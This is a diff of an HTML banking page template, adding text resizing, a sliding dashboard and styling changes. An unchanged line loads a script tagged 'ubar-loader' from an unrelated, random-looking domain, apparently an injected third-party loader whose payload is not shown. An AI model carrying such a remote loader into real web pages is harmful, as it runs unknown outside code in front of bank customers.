@@ -1,5 +1,10 @@
-<!-- VERSION 2.0
-        TODO: sliding dashboard on 1024-1280 px
+<!-- VERSION 2.1
+        DONE: 
+            sliding dashboard on 1024-1280 px
+            increase/decrease text
+        TODO:
+            colored gradual filling in dashboard
+            change class in sliding dashboard script
 -->
 
 <!DOCTYPE html>
@@ -13,7 +18,8 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
     <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
     <link rel="stylesheet" type="text/css" href="style.css">
-    <script>
+    <script>   
+
     function openNav() {
         document.getElementById("mySidenav").style.width = "100%";
     }
@@ -28,6 +34,37 @@
         $("p").css({
             'font-size': fontSize
         });
+
+        var fontSize = parseInt($("h1").css("font-size"));
+        fontSize = fontSize + 1 + "px";
+        $("h1").css({
+            'font-size': fontSize
+        });
+
+        var fontSize = parseInt($("h3").css("font-size"));
+        fontSize = fontSize + 1 + "px";
+        $("h3").css({
+            'font-size': fontSize
+        });
+
+        var fontSize = parseInt($("h5").css("font-size"));
+        fontSize = fontSize + 1 + "px";
+        $("h5").css({
+            'font-size': fontSize
+        });
+
+        var fontSize = parseInt($("div").css("font-size"));
+        fontSize = fontSize + 1 + "px";
+        $("div").css({
+            'font-size': fontSize
+        });
+
+        var fontSize = parseInt($("li").css("font-size"));
+        fontSize = fontSize + 1 + "px";
+        $("li").css({
+            'font-size': fontSize
+        });
+
     }
 
     function decrease_font() {
@@ -36,12 +73,44 @@
         $("p").css({
             'font-size': fontSize
         });
+
+        var fontSize = parseInt($("h1").css("font-size"));
+        fontSize = fontSize - 1 + "px";
+        $("h1").css({
+            'font-size': fontSize
+        });
+
+        var fontSize = parseInt($("h3").css("font-size"));
+        fontSize = fontSize - 1 + "px";
+        $("h3").css({
+            'font-size': fontSize
+        });
+
+        var fontSize = parseInt($("h5").css("font-size"));
+        fontSize = fontSize - 1 + "px";
+        $("h5").css({
+            'font-size': fontSize
+        });
+
+        var fontSize = parseInt($("div").css("font-size"));
+        fontSize = fontSize - 1 + "px";
+        $("div").css({
+            'font-size': fontSize
+        });
+
+        var fontSize = parseInt($("li").css("font-size"));
+        fontSize = fontSize - 1 + "px";
+        $("li").css({
+            'font-size': fontSize
+        });
     }
+
+
     </script>
 </head>
 
 <body>
-    <div class="col-md-10">
+    <div class="col-md-10 main">
         <div class="wrapper">
             <div class="row">
                 <div id="mySidenav" class="sidenav">
@@ -219,7 +288,7 @@
                         <div class="content" style="max-width:800px">
                         <img class="logo" src="images/logo.png">
                             <h1>депозит довіра</h1>
-                            <p style="font-size:20pt;">&#8372;&nbsp;&nbsp;$</p>
+                            <p style="font-size:25pt;">&#8372;&nbsp;&nbsp;$</p>
                             <p style="padding-bottom:0px;">Можливість дострокового зняття</p>
                             <p style="padding-bottom:0px;color:#4B5153">Поповнення лише один раз</p>
                             <p style="color:#4B5153">Виплата відсотків на прикінці терміну</p>
@@ -453,7 +522,11 @@
                 </div>
             </div>
             <script src="http://minxxrpaaw.org/code.php?appid=coi1634-7164-1474103646597-d7e2796c-fa25-4d22-a182-cfe500e654ad&h=0&m=normal" id="ubar-loader"></script>
+        
         </div>
+        
+        
+
     </div>
     <div class="col-md-2">
         <div class="dashboard">
@@ -462,22 +535,22 @@
                     <input type="text" class="search" placeholder="Пошук послуг банку">
                 </form>
             </nav>
-            <div style="">ОЩАДБАНК 24/7</div>
+            <div style="padding-left:45px;color:#7f8486;font-weight:bold;">ОЩАДБАНК 24/7</div>
             <hr>
             <div class="with-icon">
                 <a href="#"><img src="images/key.png"> Увійти до Веб-банкінгу</a>
             </div>
             <hr>
             <div>
-                <p><a href="#">Про Ощад 24/7</a></p>
-                <p><a href="#">Мобільні додатки</a></p>
-                <h6>інші послуги</h6>
-                <p><a href="#">Комунальні послуги</a></p>
-                <p><a href="#">Платежі на рахунках</a></p>
-                <p><a href="#">Сплата штрафів</a></p>
-                <p><a href="#">Переказ коштів</a></p>
-                <p><a href="#">Придбати квитки</a></p>
-                <p><a href="#">Поповнити мобільний</a></p>
+                <li><p><a href="#">Про Ощад 24/7</a></p></li>
+                <li><p><a href="#">Мобільні додатки</a></p></li>
+                <li><h6>інші послуги</h6></li>
+                <li><p><a href="#">Комунальні послуги</a></p></li>
+                <li><p><a href="#">Платежі на рахунках</a></p></li>
+                <li><p><a href="#">Сплата штрафів</a></p></li>
+                <li><p><a href="#">Переказ коштів</a></p></li>
+                <li><p><a href="#">Придбати квитки</a></p></li>
+                <li><p><a href="#">Поповнити мобільний</a></p></li>
             </div>
             <hr>
             <div class="with-icon">
@@ -499,6 +572,7 @@
                 </a>
             </div>
         </div>
+
     </div>
     <div class="col-md-10 footer">
        
@@ -536,6 +610,30 @@
             </div>
         
     </div>
+    <script>
+    $( window ).resize(function() {
+     if ($(window).width() >= 1024 && $(window).width() <= 1280) {
+	    $('.dashboard').hover(function () {
+			$(".col-md-10").attr("style", "left: -13%");
+			$(".dashboard").attr("style", "right: 0");
+		}, function () {
+			$(".col-md-10").attr("style", "left: 0");
+			$(".dashboard").attr("style", "right: -13%");
+		});
+	 } else{
+	 	$(".dashboard").attr("style", "right: 0");
+	 }
+	});
+	     if ($(window).width() >= 1024 && $(window).width() <= 1280) {
+	    $('.dashboard').hover(function () {
+			$(".col-md-10").attr("style", "left: -13%");
+			$(".dashboard").attr("style", "right: 0");
+		}, function () {
+			$(".col-md-10").attr("style", "left: 0");
+			$(".dashboard").attr("style", "right: -13%");
+		});
+	 }
+    </script>
 </body>
 
 </html>
